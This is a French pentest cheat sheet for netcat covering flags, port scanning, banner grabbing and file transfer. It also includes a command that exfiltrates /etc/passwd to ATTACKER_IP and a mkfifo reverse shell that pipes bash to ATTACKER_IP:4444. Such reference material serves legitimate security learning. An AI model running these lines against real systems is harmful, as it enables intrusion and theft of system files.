# 🛠️ netcat (nc) — Le Couteau Suisse du Réseau

## 1. Description rapide

**netcat** (`nc`) lit et écrit des données brutes via des connexions TCP ou UDP. Outil fondamental en pentest et en administration pour : scan de ports rapide, transfert de fichiers, banner grabbing, création de listeners pour reverse shells et test de connectivité de bas niveau.

---

## 2. Syntaxe de base

```bash
# Mode client (connexion sortante)
nc [options] hôte port

# Mode serveur (écoute entrante)
nc -l [options] [port]
```

---

## 3. Options et fanions principaux

| Flag | Rôle |
| --- | --- |
| `-l` | Mode écoute (listener) |
| `-v` | Mode verbeux (affiche la connexion établie) |
| `-vv` | Très verbeux (détails supplémentaires) |
| `-n` | Pas de résolution DNS |
| `-p PORT` | Port source local (client) |
| `-z` | Mode scan (zero-I/O, pas de données envoyées) |
| `-u` | Mode UDP (défaut : TCP) |
| `-w N` | Timeout de connexion en secondes |
| `-e CMD` | Exécute une commande sur connexion (BSD/Windows, absent sur Linux) |
| `-k` | Maintient le listener actif après déconnexion (ncat) |
| `-q N` | Délai avant fermeture après EOF (BSD nc) |

---

## 4. Exemples pratiques

```bash
# Scan de ports rapide sur une plage (sans nmap)
nc -zvn 192.168.1.1 20-1024 2>&1 | grep succeeded
```

```bash
# Banner grabbing : se connecter à un service et lire sa bannière
nc -vn 192.168.1.10 22
nc -vn 192.168.1.10 80   # puis taper : HEAD / HTTP/1.0 + 2x Entrée
```

```bash
# Listener pour un reverse shell (côté attaquant)
nc -lvnp 4444
```

```bash
# Transfert de fichier : récepteur (attaquant), puis émetteur (cible)
# Côté récepteur (attaquant) — ouvrir en premier :
nc -lvnp 9001 > fichier_recu.txt

# Côté émetteur (cible) :
nc ATTACKER_IP 9001 < /etc/passwd
```

```bash
# Chat brut entre deux machines (test de connectivité bidirectionnelle)
# Machine A (écoute) :
nc -lvnp 5555

# Machine B (connexion) :
nc -vn IP_MACHINE_A 5555
```

```bash
# Reverse shell sans -e (pipe mkfifo pour les systèmes Linux sans -e)
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

---

## 5. Astuces & Pièges à éviter

!!! tip "nc -zv pour un scan rapide sans nmap"
    Sur un système sans nmap, `nc -zvn IP 1-65535 2>&1 | grep succeeded` scanne tous les ports TCP et liste les ouverts. Lent mais disponible sur presque tous les systèmes Unix.

!!! tip "Préférer ncat (nmap) pour les fonctionnalités avancées"
    `ncat` (fourni avec nmap) supporte TLS (`--ssl`), l'option `--keep-open` (-k) pour des listeners persistants, le proxy et le mode broker. Il est rétro-compatible avec `nc` pour les usages basiques.

!!! warning "-e est absent sur les nc Linux modernes"
    La version OpenBSD de `nc` (présente par défaut sur la plupart des distributions Linux) **ne supporte pas `-e`**. Pour exécuter un shell sur connexion, utiliser le pipe mkfifo (exemple ci-dessus), `ncat -e`, ou `socat`.

!!! warning "Un listener nc accepte une seule connexion"
    `nc -lvnp PORT` s'arrête après la première connexion. Pour un listener persistant (plusieurs reconnexions), utiliser `while true; do nc -lvnp 4444; done` ou `ncat --keep-open -lvnp 4444`.
